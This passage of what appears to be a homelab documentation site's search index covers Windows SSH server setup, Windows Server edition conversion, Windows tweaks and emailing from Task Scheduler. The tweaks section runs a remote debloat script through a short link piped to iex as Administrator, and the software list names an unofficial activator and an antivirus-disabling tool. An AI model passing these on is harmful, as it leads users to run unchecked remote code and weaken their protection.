| Select-Object Name , Enabled )) { Write-Output \"Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it...\" New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 } else { Write-Output \"Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists.\" } At this point you should be able to connect via SSH to the Windows server with your username and password. Adding SSH Keys \u00b6 Administrator User \u00b6 Create the file: administrators_authorized_keys at the following location: C:\\ProgramData\\ssh\\administrators_authorized_keys Edit the file and add you SSH public key to the file. Now we need to import the SSH public key to the Windows SSH server. We can do this by using the following command: icacls . exe \"C:\\ProgramData\\ssh\\administrators_authorized_keys\" / inheritance : r / grant \"Administrators:F\" / grant \"SYSTEM:F\" Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect to the Windows server with your SSH key Regular User (non-administrator) \u00b6 Create a .ssh directory in the home directory of the user. ```path C:\\Users\\<username>\\.ssh\\ Create the file: authorized_keys at the following location: C:\\Users\\<username>\\.ssh\\authorized_keys Edit the file and add you SSH public key to the file. Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect with non-administrator user to the Windows server with your SSH key PowerShell as Default Shell for SSH \u00b6 By default the SSH client uses the Windows command prompt as the default shell. We can change the default shell to PowerShell running the following PowerShell command: New-ItemProperty -Path \"HKLM:\\SOFTWARE\\OpenSSH\" -Name DefaultShell -Value \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -PropertyType String -Force Next to you connet to the Windows SSG server it should start the PowerShell shell. It should look something like this:", "title": "Windows SSH Server"}, {"location": "windows/ssh-server/#windows-ssh-server", "text": "Sometime you need to connect to a remote server via SSH . Usually it's the main connection to linux servers. But you can also connect to a windows server via SSH . At this guide we will show you how to install and configure a windows ssh server, including SSH Keys authentication .", "title": "Windows SSH Server"}, {"location": "windows/ssh-server/#ssh-server-installation-on-windows", "text": "We will be using PowerShell to install the SSH server inculding the SSH client. Open PowerShell Terminal as Administrator. Run the following commands to install the SSH server and client. Add-WindowsCapability -Online -Name OpenSSH . Client ~~~~ 0 . 0 . 1 . 0 Add-WindowsCapability -Online -Name OpenSSH . Server ~~~~ 0 . 0 . 1 . 0 After the installaton you can check the Windows SSH server and client are installed. Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*' The output will be something like this: To start the Windows SSH server service Start-Service sshd Enable Windows SSH Server on Windows Boot Set-Service -Name sshd -StartupType 'Automatic' Add a Firewall rule to allow the SSH port if (!( Get-NetFirewallRule -Name \"OpenSSH-Server-In-TCP\" -ErrorAction SilentlyContinue | Select-Object Name , Enabled )) { Write-Output \"Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it...\" New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 } else { Write-Output \"Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists.\" } At this point you should be able to connect via SSH to the Windows server with your username and password.", "title": "SSH Server Installation on Windows"}, {"location": "windows/ssh-server/#adding-ssh-keys", "text": "", "title": "Adding SSH Keys"}, {"location": "windows/ssh-server/#administrator-user", "text": "Create the file: administrators_authorized_keys at the following location: C:\\ProgramData\\ssh\\administrators_authorized_keys Edit the file and add you SSH public key to the file. Now we need to import the SSH public key to the Windows SSH server. We can do this by using the following command: icacls . exe \"C:\\ProgramData\\ssh\\administrators_authorized_keys\" / inheritance : r / grant \"Administrators:F\" / grant \"SYSTEM:F\" Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect to the Windows server with your SSH key", "title": "Administrator User"}, {"location": "windows/ssh-server/#regular-user-non-administrator", "text": "Create a .ssh directory in the home directory of the user. ```path C:\\Users\\<username>\\.ssh\\ Create the file: authorized_keys at the following location: C:\\Users\\<username>\\.ssh\\authorized_keys Edit the file and add you SSH public key to the file. Test the SSH connection to the Windows server from remote machine with the SSH Key. You should be able to connect with non-administrator user to the Windows server with your SSH key", "title": "Regular User (non-administrator)"}, {"location": "windows/ssh-server/#powershell-as-default-shell-for-ssh", "text": "By default the SSH client uses the Windows command prompt as the default shell. We can change the default shell to PowerShell running the following PowerShell command: New-ItemProperty -Path \"HKLM:\\SOFTWARE\\OpenSSH\" -Name DefaultShell -Value \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -PropertyType String -Force Next to you connet to the Windows SSG server it should start the PowerShell shell. It should look something like this:", "title": "PowerShell as Default Shell for SSH"}, {"location": "windows/useful-software/", "text": "Useful Software \u00b6 Win 10 ISO Official Download \u00b6 Microsoft Official Windows 10 Download List of Useful Software \u00b6 Application Description MAS Windows & Office Activation Windows Tweaker 4 for Windows 10 Windows Tweaker Defender Control Windows Defender control Link Shell Extension Symlinks For Windows Winaero Tweaker Winaero Tweaker Autologon Autologon at boot", "title": "Useful Software"}, {"location": "windows/useful-software/#useful-software", "text": "", "title": "Useful Software"}, {"location": "windows/useful-software/#win-10-iso-official-download", "text": "Microsoft Official Windows 10 Download", "title": "Win 10 ISO Official Download"}, {"location": "windows/useful-software/#list-of-useful-software", "text": "Application Description MAS Windows & Office Activation Windows Tweaker 4 for Windows 10 Windows Tweaker Defender Control Windows Defender control Link Shell Extension Symlinks For Windows Winaero Tweaker Winaero Tweaker Autologon Autologon at boot", "title": "List of Useful Software"}, {"location": "windows/windows-servers/", "text": "Windows Servers \u00b6 Basic Setup \u00b6 At Server Manager click Configure this local server Computer name - rename the server's name Remote Desktop - allow RDP Ethernet instance - disable IPV6 Feedback & Diagnostics - set Feedback frequency to Never IE Enhanced Security Configuration - Off Time zone - set the current timezone, At Internet Time tab chanche time.windwos.com to time.nist.gov Open gpedit.msc with Run Local Computer Policy -> Administrative Templates -> System -> Display Shutdown Even Tracker - Disable Local Computer Policy -> Windows Settings -> Security Settings -> Local Policies -> Security Options ->Interactive logon: Do not require CTRL+ALT+DEL - Enable Convert Evaluation Copy to Full Version \u00b6 When using the Evaluation version of Windows Server, the desktop displays the current build and the time until the end of the grace period (Windows License valid for 180 days). Windows Server 2022 \u00b6 Run from Powershell: Windows Server 2022 Standard dism / online / set-edition : serverstandard / productkey : VDYBN - 27WPP-V4HQT - 9VMD4-VMK7H / accepteula Windows Server 2022 Datacenter: dism / online / set-edition : serverdatacenter / productkey : WX4NM-KYWYW-QJJR4-XV3QB - 6VM33 / accepteula Windows Server 2019 \u00b6 Run from Powershell: Windows Server 2019 Standard dism / online / set-edition : ServerStandard / productkey : N69G4-B89J2 - 4G8F4-WWYCC-J464C / accepteula Windows Server 2019 Datacenter: dism / online / set-edition : ServerDatacenter / productkey : WMDGN-G9PQG-XVVXX-R3X43 - 63DFG / accepteula", "title": "Windows Servers"}, {"location": "windows/windows-servers/#windows-servers", "text": "", "title": "Windows Servers"}, {"location": "windows/windows-servers/#basic-setup", "text": "At Server Manager click Configure this local server Computer name - rename the server's name Remote Desktop - allow RDP Ethernet instance - disable IPV6 Feedback & Diagnostics - set Feedback frequency to Never IE Enhanced Security Configuration - Off Time zone - set the current timezone, At Internet Time tab chanche time.windwos.com to time.nist.gov Open gpedit.msc with Run Local Computer Policy -> Administrative Templates -> System -> Display Shutdown Even Tracker - Disable Local Computer Policy -> Windows Settings -> Security Settings -> Local Policies -> Security Options ->Interactive logon: Do not require CTRL+ALT+DEL - Enable", "title": "Basic Setup"}, {"location": "windows/windows-servers/#convert-evaluation-copy-to-full-version", "text": "When using the Evaluation version of Windows Server, the desktop displays the current build and the time until the end of the grace period (Windows License valid for 180 days).", "title": "Convert Evaluation Copy to Full Version"}, {"location": "windows/windows-servers/#windows-server-2022", "text": "Run from Powershell: Windows Server 2022 Standard dism / online / set-edition : serverstandard / productkey : VDYBN - 27WPP-V4HQT - 9VMD4-VMK7H / accepteula Windows Server 2022 Datacenter: dism / online / set-edition : serverdatacenter / productkey : WX4NM-KYWYW-QJJR4-XV3QB - 6VM33 / accepteula", "title": "Windows Server 2022"}, {"location": "windows/windows-servers/#windows-server-2019", "text": "Run from Powershell: Windows Server 2019 Standard dism / online / set-edition : ServerStandard / productkey : N69G4-B89J2 - 4G8F4-WWYCC-J464C / accepteula Windows Server 2019 Datacenter: dism / online / set-edition : ServerDatacenter / productkey : WMDGN-G9PQG-XVVXX-R3X43 - 63DFG / accepteula", "title": "Windows Server 2019"}, {"location": "windows/windows-tweaks/", "tags": ["Windwos", "Tweeks"], "text": "Windwos 10/11 Tweeks \u00b6 Some tips and tricks and Tweeks for Windows 10/11 that may be helpful or even essential for you Deblot Windwos 10/11 Powershell Script \u00b6 Source: Windows10Debloater Github Page Run as Administrator: iwr -useb https://git.io/debloat|iex Enable the Legacy Context Menu in Windows 11 \u00b6 To enable the context menu that appeared in Windows 10 and earlier, you can use the following PowerShell snippet. New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" -Value \"\" -Force You may need to log out and log back in or restart explorer.exe . Get-Process explorer | Stop-Process The context menu will now look like this: Allow ICMP (Ping) in Windows Firewall \u00b6 The following commands will allow ICMP (Ping) in Windows Firewall. Use Powershell as Administrator to run the following commands. For IPv4: netsh advfirewall firewall add rule name = \"ICMP Allow incoming V4 echo request\" protocol = \"icmpv4:8,any\" dir = in action = allow For IPv6: netsh advfirewall firewall add rule name = \"ICMP Allow incoming V6 echo request\" protocol = \"icmpv6:8,any\" dir = in action = allow Activate Administrator User \u00b6 Hit the Windows Key + R and type lusrmgr.msc Edit Administrator, remove the - [x] Account is disable. ok Right Click on Administrator and click Set Password Lunch \"Network Connections\" \u00b6 Hit the Windows Key + R and type ncpa.cpl Add Program to Startup - Windows 7,8,10 & Servers \u00b6 Hit WIN+R or from start menu search run and press enter. At run dialog enter shell:common startup : Create shortcut for the program you want to auto startup when Windows boots. Move the shortcut to the Startup folder that opened before. Reboot or Shutdown Windows From Command Line (CMD) \u00b6 Reboot windows computer This command will set a time out of 10 seconds to close the applications. After 10 seconds, windows reboot will start. shutdown /r /t 10 Force reboot shutdown /r /f /t 0 Force Shutdown shutdown /s /f /t 0", "title": "Windwos 10/11 Tweeks"}, {"location": "windows/windows-tweaks/#windwos-1011-tweeks", "text": "Some tips and tricks and Tweeks for Windows 10/11 that may be helpful or even essential for you", "title": "Windwos 10/11 Tweeks"}, {"location": "windows/windows-tweaks/#deblot-windwos-1011-powershell-script", "text": "Source: Windows10Debloater Github Page Run as Administrator: iwr -useb https://git.io/debloat|iex", "title": "Deblot Windwos 10/11 Powershell Script"}, {"location": "windows/windows-tweaks/#enable-the-legacy-context-menu-in-windows-11", "text": "To enable the context menu that appeared in Windows 10 and earlier, you can use the following PowerShell snippet. New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" -Value \"\" -Force You may need to log out and log back in or restart explorer.exe . Get-Process explorer | Stop-Process The context menu will now look like this:", "title": "Enable the Legacy Context Menu in Windows 11"}, {"location": "windows/windows-tweaks/#allow-icmp-ping-in-windows-firewall", "text": "The following commands will allow ICMP (Ping) in Windows Firewall. Use Powershell as Administrator to run the following commands. For IPv4: netsh advfirewall firewall add rule name = \"ICMP Allow incoming V4 echo request\" protocol = \"icmpv4:8,any\" dir = in action = allow For IPv6: netsh advfirewall firewall add rule name = \"ICMP Allow incoming V6 echo request\" protocol = \"icmpv6:8,any\" dir = in action = allow", "title": "Allow ICMP (Ping) in Windows Firewall"}, {"location": "windows/windows-tweaks/#activate-administrator-user", "text": "Hit the Windows Key + R and type lusrmgr.msc Edit Administrator, remove the - [x] Account is disable. ok Right Click on Administrator and click Set Password", "title": "Activate Administrator User"}, {"location": "windows/windows-tweaks/#lunch-network-connections", "text": "Hit the Windows Key + R and type ncpa.cpl", "title": "Lunch \"Network Connections\""}, {"location": "windows/windows-tweaks/#add-program-to-startup-windows-7810-servers", "text": "Hit WIN+R or from start menu search run and press enter. At run dialog enter shell:common startup : Create shortcut for the program you want to auto startup when Windows boots. Move the shortcut to the Startup folder that opened before.", "title": "Add Program to Startup - Windows 7,8,10 &amp; Servers"}, {"location": "windows/windows-tweaks/#reboot-or-shutdown-windows-from-command-line-cmd", "text": "Reboot windows computer This command will set a time out of 10 seconds to close the applications. After 10 seconds, windows reboot will start. shutdown /r /t 10 Force reboot shutdown /r /f /t 0 Force Shutdown shutdown /s /f /t 0", "title": "Reboot or Shutdown Windows From Command Line (CMD)"}, {"location": "windows/guides/declare-locations/", "text": "Declare Locations as \"Inside Your Local Network\" \u00b6 Warning The Intranet Zone is the most trusted and least protected zone. DO NOT put any subnets or IP addresses in this zone unless they are TOTALLY under YOUR control. That includes ANY public server, web site, subnet, or IP address. Select 'Control Panel'/'Internet Properties'/'Security' tab. (Alternatively, open Internet Explorer and select 'Tools'/'Internet Options'/'Security' tab.) Highlight 'Local Intranet' and click 'Sites'. Set the following: Uncheck 'Automatically detect intranet network'.Check 'Include all local (intranet) sites not listed in other zones'.Uncheck 'Include all sites that bypass the proxy server'.Check 'Include all network paths (UNCs)'.\u200b Click 'Advanced' Uncheck 'Require server verification (https:) for all sites in this zone'. In the field labeled 'Add this web site to the zone:', add your local, private subnet using an asterisk for a network mask and click 'Add'. E.g. If your home (local) network is 192.168.25.0 with a mask of 255.255.255.0, enter '192.168.25.*' (without the quotes). Note Entries can be:\u200b Individual IP addresses (e.g. '192.168.5.25', etc.), Class C subnets (e.g. '192.168.27.*'), Class B subnets (e.g. '172.16. . '), or Class A subnets (e.g. '10. . .*')\u200b You can add as many addresses as you need to the list It can be handy add the address of a VPN subnet to the list if it is also private and you TOTALLY trust it.\u200b Close out with 'Close'/'OK'/'OK' and close the Control Panel (or Internet Explorer).", "title": "Declare Locations as \"Inside Your Local Network\""}, {"location": "windows/guides/declare-locations/#declare-locations-as-inside-your-local-network", "text": "Warning The Intranet Zone is the most trusted and least protected zone. DO NOT put any subnets or IP addresses in this zone unless they are TOTALLY under YOUR control. That includes ANY public server, web site, subnet, or IP address. Select 'Control Panel'/'Internet Properties'/'Security' tab. (Alternatively, open Internet Explorer and select 'Tools'/'Internet Options'/'Security' tab.) Highlight 'Local Intranet' and click 'Sites'. Set the following: Uncheck 'Automatically detect intranet network'.Check 'Include all local (intranet) sites not listed in other zones'.Uncheck 'Include all sites that bypass the proxy server'.Check 'Include all network paths (UNCs)'.\u200b Click 'Advanced' Uncheck 'Require server verification (https:) for all sites in this zone'. In the field labeled 'Add this web site to the zone:', add your local, private subnet using an asterisk for a network mask and click 'Add'. E.g. If your home (local) network is 192.168.25.0 with a mask of 255.255.255.0, enter '192.168.25.*' (without the quotes). Note Entries can be:\u200b Individual IP addresses (e.g. '192.168.5.25', etc.), Class C subnets (e.g. '192.168.27.*'), Class B subnets (e.g. '172.16. . '), or Class A subnets (e.g. '10. . .*')\u200b You can add as many addresses as you need to the list It can be handy add the address of a VPN subnet to the list if it is also private and you TOTALLY trust it.\u200b Close out with 'Close'/'OK'/'OK' and close the Control Panel (or Internet Explorer).", "title": "Declare Locations as \"Inside Your Local Network\""}, {"location": "windows/guides/email-from-task-scheduler/", "text": "Send Emails From The Windows Task Scheduler \u00b6 First, download SendEmail , a free (and open source) tool for sending emails from the command line. Extract the downloaded archive into a folder on your computer. Next, launch the Windows Task Scheduler and create a new task \u2013 consult our guide to creating scheduled tasks for more information. You can create a task that automatically sends an email at a specific time or a task that sends an email in response to a specific event. When you reach the Action window, select Start a program instead of Send an e-mail. In the Program/script box, use the Browse button and navigate to the SendEmail.exe file on your computer. Finally, you\u2019ll have to add the arguments required to authenticate with your SMTP server and construct your email. Here\u2019s a list of the options you can use with SendEmail: Server Options \u00b6 -f EMAIL \u2013 The email address you\u2019re sending from. -s SERVER:PORT \u2013 The SMTP server and port it requires. -xu USERNAME \u2013 The username you need to authenticate with the SMTP server. -xp PASSWORD \u2013 The password you need to authenticate with the SMTP server. -o tls=yes \u2013 Enables TLS encryption. May be necessary for some SMTP servers. If you\u2019re using Gmail\u2019s SMTP servers, these are the server options you\u2019ll need: -s smtp.gmail.com:587 -xu you@gmail.com -xp password -o tls=yes Of course, you\u2019ll have to enter your own email address and password here. Destination Options \u00b6 -t EMAIL \u2013 The destination email address. You can send an email to multiple addresses by including a space between each address after the -t option. -cc EMAIL \u2013 Any addresses you\u2019d like to CC on the email. You can specify multiple addresses by placing a space between each email address, just as with the -t command above. -bcc EMAIL \u2013 The BCC version of the CC option above. Email Options \u00b6 -u SUBJECT \u2013 The subject of your email -m BODY \u2013 The message body text of your email. -a ATTACHMENT \u2013 The path of a file you\u2019d like to attach. This is optional. For example, let\u2019s say your email address is example@gmail.com and you\u2019d like to send an email to person@example.com . You\u2019d use the following options: -f example@gmail.com -t person@example.com -u Subject -m This is the body text! -s smtp.gmail.com:587 -xu example@gmail.com -xp password -o tls=yes Once you\u2019ve put together your options, copy and paste them into the Add arguments box. Save your task and you\u2019re done. Your task will automatically send email on the schedule (or in response to the event) you specified.", "title": "Send Emails From The Windows Task Scheduler"}, {"location": "windows/guides/email-from-task-scheduler/#send-emails-from-the-windows-task-scheduler", "text": "First, download SendEmail , a free (and open source) tool for sending emails from the command line. Extract the downloaded archive into a folder on your computer. Next, launch the Windows Task Scheduler and create a new task \u2013 consult our guide to creating scheduled tasks for more information. You can create a task that automatically sends an email at a specific time or a task that sends an email in response to a specific event. When you reach the Action window, select Start a program instead of Send an e-mail. In the Program/script box, use the Browse button and navigate to the SendEmail.exe file on your computer. Finally, you\u2019ll have to add the arguments required to authenticate with your SMTP server and construct your email. Here\u2019s a list of the options you can use with SendEmail:", "title": "Send Emails From The Windows Task Scheduler"}, {"location": "windows/guides/email-from-task-scheduler/#server-options", "text": "-f EMAIL \u2013 The email address you\u2019re sending from. -s SERVER:PORT \u2013 The SMTP server and port it requires. -xu USERNAME \u2013 The username you need to authenticate with the SMTP server. -xp PASSWORD \u2013 The password you need to authenticate with the SMTP server. -o tls=yes \u2013 Enables TLS encryption. May be necessary for some SMTP servers. If you\u2019re using Gmail\u2019s SMTP servers, these are the server options you\u2019ll need: -s smtp.gmail.com:587 -xu you@gmail.com -xp password -o tls=yes Of course, you\u2019ll have to enter your own email address and password here.", "title": "Server Options"}, {"location": "windows/guides/email-from-task-scheduler/#destination-options", "text": "-t EMAIL \u2013 The destination email address. You can send an email to multiple addresses by including a space between each address after the -t option. -cc EMAIL \u2013 Any addresses you\u2019d like to CC on the email. You can specify multiple addresses by placing a space between each email address, just as with the -t command above. -bcc EMAIL \u2013 The BCC version of the CC option above.", "title": "Destination Options"}, {"location": "windows/guides/email-from-task-scheduler/#email-options", "text": "-u SUBJECT \u2013 The subject of your email -m BODY \u2013 The message body text of your email. -a ATTACHMENT \u2013 The path of a file you\u2019d like to attach. This is optional. For example, let\u2019s say your email address is example@gmail.com and you\u2019d like to send an email to person@example.com . You\u2019d use the following options: -f example@gmail.com -t person@example.com -u Subject -m This is the body text! -s smtp.gmail.com:587 -xu example@gmail.com -xp password -o tls=yes Once you\u2019ve put together your options, copy and paste them into the Add arguments box. Save your task and you\u2019re done. Your task will automatically send email on the schedule (or in response to the event) you specified.", "title": "Email Options"}, {"location": "tags/", "text": "Tags and Categories \u00b6 Cookies \u00b6 Cookies Policy HomeLab \u00b6 Synology NAS MacOS \u00b6 Pyenv-virtualenv Multi Version Virtual Environment NAS \u00b6 Synology NAS Proxmox \u00b6 Windows VM Configuration Python \u00b6 Pyenv-virtualenv Multi Version Virtual Environment Synology \u00b6 Synology NAS Tweeks \u00b6 Windwos 10/11 Tweeks Ubuntu \u00b6 Free Port 53 on Ubuntu VirtIO \u00b6 Windows VM Configuration Windows Virtual Machines \u00b6 Windows VM Configuration Windwos \u00b6 Windwos 10/11 Tweeks adb \u00b6 ADB Cheat Sheet admonition \u00b6 Admonitions affiliate \u00b6 Affiliate Disclosure android \u00b6 ADB Cheat Sheet Apktool PT Application MobSF SSL Pinning Bypass apktool \u00b6 Apktool application \u00b6 PT Application autofs \u00b6 SMB Mount With autofs automation \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell Syncthing Motion Sensor Display Control bash \u00b6 DDNS Cloudflare Bash BrewUp cheat-sheet \u00b6 ADB Cheat Sheet Npm Command-line Utility PM2 - Node.js Process Manager Pip Package Manager Supervisor Process Manager Virtual Environment Ruby Gem Package Manager Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Git Cli Cheat Sheet Submodules Cheat Sheet chrome \u00b6 Chrome Extensions cloudflare \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell Let's Encrypt with Cloudflare code-blocks \u00b6 Code Blocks container \u00b6 Watchtower content-tabs \u00b6 Content Tabs ddns \u00b6 DDNS Cloudflare Bash DDNS Cloudflare PowerShell debian \u00b6 Disable IPv6 diagram \u00b6 Diagrams dns \u00b6 Pi-hole with DOH on Docker Free Port 53 on Ubuntu dns-over-https \u00b6 Pi-hole with DOH on Docker docker \u00b6 Pi-hole with DOH on Docker Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Watchtower Docker on Raspberry Pi docker-compose \u00b6 Docker on Raspberry Pi doh \u00b6 Pi-hole with DOH on Docker dsm \u00b6 SSH With RSA Keys emojis \u00b6 Icons & Emojis endorsements \u00b6 Website Endorsements extensions \u00b6 Chrome Extensions Firefox Extensions external-markdown \u00b6 Embed External Markdown files-handling \u00b6 Files Handling firefox \u00b6 Firefox Extensions frida \u00b6 SSL Pinning Bypass gem \u00b6 Ruby Gem Package Manager git \u00b6 Git Cli Cheat Sheet github \u00b6 Removing Sensitive Data Git Cli Cheat Sheet Submodules Cheat Sheet BrewUp headings \u00b6 Basic Formatting history \u00b6 Removing Sensitive Data homebrew \u00b6 BrewUp Brew Snippets horizontal-line \u00b6 Basic Formatting iTerm2 \u00b6 TouchID for sudo icons \u00b6 Icons & Emojis igpu \u00b6 iGPU Passthrough to VM iGPU Split Passthrough images \u00b6 Images information \u00b6 Affiliate Disclosure Cookies Policy Website Endorsements MIT License Privacy Policy ipv6 \u00b6 Disable IPv6 on Proxmox Disable IPv6 letsencrypt \u00b6 Let's Encrypt with Cloudflare license \u00b6 MIT License links \u00b6 Links linux \u00b6 Syncthing Better Terminal Experience Files Handling Identify Network Interfaces lists \u00b6 Tables, Lists and Quotes macOS \u00b6 Applications Tweaks Enable Root User TouchID for sudo UI Tweaks BrewUp Brew Snippets macos \u00b6 Syncthing Better Terminal Experience magicmirror \u00b6 Magic Mirror 2.0 markdown \u00b6 Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin markdown-cheatsheet \u00b6 About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes mermaid \u00b6 Diagrams mkdocs \u00b6 About Markdown Admonitions Basic Formatting Code Blocks Content Tabs Diagrams Embed External Markdown Icons & Emojis Images Links Tables, Lists and Quotes motion-sensor \u00b6 Motion Sensor Display Control mount \u00b6 SMB Mount With autofs network \u00b6 Proxmox Networking Identify Network Interfaces node \u00b6 Npm Command-line Utility PM2 - Node.js Process Manager npm \u00b6 Npm Command-line Utility PM2 - Node.js Process Manager oh-my-zsh \u00b6 Better Terminal Experience package-manager \u00b6 Pip Package Manager Ruby Gem Package Manager passthrough \u00b6 iGPU Passthrough to VM iGPU Split Passthrough penetration-testing \u00b6 Apktool PT Application MobSF pi-hole \u00b6 Pi-hole with DOH on Docker pip \u00b6 Pip Package Manager pm2 \u00b6 PM2 - Node.js Process Manager portfolio \u00b6 Stas Yakobov's Portfolio powershell \u00b6 DDNS Cloudflare PowerShell Windows SSH Server privacy policy \u00b6 Privacy Policy process-manager \u00b6 PM2 - Node.js Process Manager processes-manager \u00b6 Supervisor Process Manager proxmox \u00b6 Cloud Image Template Let's Encrypt with Cloudflare PVE Kernel Cleaner VM Disk Expander iGPU Passthrough to VM iGPU Split Passthrough Disable IPv6 on Proxmox Proxmox Networking python \u00b6 Pip Package Manager Supervisor Process Manager Virtual Environment quotes \u00b6 Tables, Lists and Quotes raspberry-pi \u00b6 Docker on Raspberry Pi External Power Button Motion Sensor Display Control Magic Mirror 2.0 resume \u00b6 Stas Yakobov's Portfolio reverse-engineering \u00b6 Apktool rsa-keys \u00b6 SSH With RSA Keys Windows SSH Server ruby \u00b6 Ruby Gem Package Manager security \u00b6 Removing Sensitive Data share \u00b6 SMB Mount With autofs smb \u00b6 SMB Mount With autofs ssh \u00b6 SSH With RSA Keys ssh-server \u00b6 Windows SSH Server ssl-pinning \u00b6 SSL Pinning Bypass submodules \u00b6 Submodules Cheat Sheet supervisor \u00b6 Supervisor Process Manager syncthing \u00b6 Syncthing synology \u00b6 Syncthing SSH With RSA Keys tables \u00b6 Tables, Lists and Quotes template \u00b6 Disable IPV6 oh-my-zsh Install GPU Passthrough to VM oh-my-zsh on Synology NAS Free 80,443 Ports SSH Passphrase to Keychain Terminal Snippets Awesome Pages Plugin terminal \u00b6 Better Terminal Experience TouchID for sudo text-highlighting \u00b6 Basic Formatting touchID \u00b6 TouchID for sudo ubiquiti \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN ubuntu \u00b6 Disable IPv6 Remove Snap Store udm \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN unifi \u00b6 CLI Commands Failover Telegram Notifications Persistent Boot Script Persistent SSH Keys Wireguard VPN venv \u00b6 Virtual Environment virtualization \u00b6 Cloud Image Template VM Disk Expander watchtower \u00b6 Watchtower windows \u00b6 Syncthing Windows SSH Server wireguard \u00b6 Wireguard VPN zsh \u00b6 Better Terminal Experience", "title": "Tags and Categories"}, {"location": "tags/#tags-and-categories", "text": "", "title": "Tags and Categories"}, {"location": "tags/#cookies", "text": "Cookies Policy", "title": "Cookies"}, {"location": "tags/#homelab", "text": "Synology NAS", "title": "HomeLab"}, {"location": "tags/#macos", "text": "Pyenv-virtualenv Multi Version Virtual Environment", "title": "MacOS"}, {"location": "tags/#nas", "text": "Synology NAS", "title": "NAS"}, {"location": "tags/#proxmox", "text": "Windows VM Configuration", "title": "Proxmox"}, {"location": "tags/#python", "text": "Pyenv-virtualenv Multi Version Virtual Environment", "title": "Python"}, {"location": "tags/#synology", "text": "Synology NAS", "title": "Synology"}, {"location": "tags/#tweeks", "text": "Windwos 10/11 Tweeks", "title": "Tweeks"}, {"location": "tags/#ubuntu", "text": "Free Port 53 on Ubuntu", "title": "Ubuntu"}, {"location": "tags/#virtio", "text": "Windows VM Configuration", "title": "VirtIO"}, {"location": "tags/#windows-virtual-machines", "text": "Windows VM Configuration", "title": "Windows Virtual Machines"}, {"location": "tags/#windwos", "text": "Windwos 10/11 Tweeks", "title": "Windwos"}, {"location": "tags/#adb", "text": "ADB Cheat Sheet", "title": "adb"}, {"location": "tags/#admonition", "text": "Admonitions", "title": "admonition"}, {"location": "tags/#affiliate", "text": "Affiliate Disclosure", "title": "affiliate"}, {"location": "tags/#android", "text": "ADB Cheat Sheet Apktool PT Application MobSF SSL Pinning Bypass", "title": "android"}, {"location": "tags/#apktool", "text": "Apktool", "title": "apktool"}, {"location": "tags/#application", "text": "PT Application", "title": "application"}, {"location": "tags/#autofs", "text": "SMB Mount With autofs", "title": "autofs"}, {"location": "tags/#automation", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell Syncthing Motion Sensor Display Control", "title": "automation"}, {"location": "tags/#bash", "text": "DDNS Cloudflare Bash BrewUp", "title": "bash"}, {"location": "tags/#cheat-sheet", "text": "ADB Cheat Sheet Npm Command-line Utility PM2 - Node.js Process Manager Pip Package Manager Supervisor Process Manager Virtual Environment Ruby Gem Package Manager Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Git Cli Cheat Sheet Submodules Cheat Sheet", "title": "cheat-sheet"}, {"location": "tags/#chrome", "text": "Chrome Extensions", "title": "chrome"}, {"location": "tags/#cloudflare", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell Let's Encrypt with Cloudflare", "title": "cloudflare"}, {"location": "tags/#code-blocks", "text": "Code Blocks", "title": "code-blocks"}, {"location": "tags/#container", "text": "Watchtower", "title": "container"}, {"location": "tags/#content-tabs", "text": "Content Tabs", "title": "content-tabs"}, {"location": "tags/#ddns", "text": "DDNS Cloudflare Bash DDNS Cloudflare PowerShell", "title": "ddns"}, {"location": "tags/#debian", "text": "Disable IPv6", "title": "debian"}, {"location": "tags/#diagram", "text": "Diagrams", "title": "diagram"}, {"location": "tags/#dns", "text": "Pi-hole with DOH on Docker Free Port 53 on Ubuntu", "title": "dns"}, {"location": "tags/#dns-over-https", "text": "Pi-hole with DOH on Docker", "title": "dns-over-https"}, {"location": "tags/#docker", "text": "Pi-hole with DOH on Docker Common Docker Commands Containers Cheat Sheet Images Cheat Sheet Docker Installation Networks & Links Cheat Sheet Security & Best Practices Watchtower Docker on Raspberry Pi", "title": "docker"}, {"location": "tags/#docker-compose", "text": "Docker on Raspberry Pi", "title": "docker-compose"}, {"location": "tags/#doh", "text": "Pi-hole with DOH on Docker", "title": "doh"}, {"location": "tags/#dsm", "text": "SSH With RSA Keys", "title": "dsm"}, {"location": "tags/#emojis", "text": "Icons & Emojis", "title": "emojis"}, {"location": "tags/#endorsements", "text": "Website Endorsements", "title": "endorsements"}, {"location": "tags/#extensions", "text": "Chrome Extensions Firefox 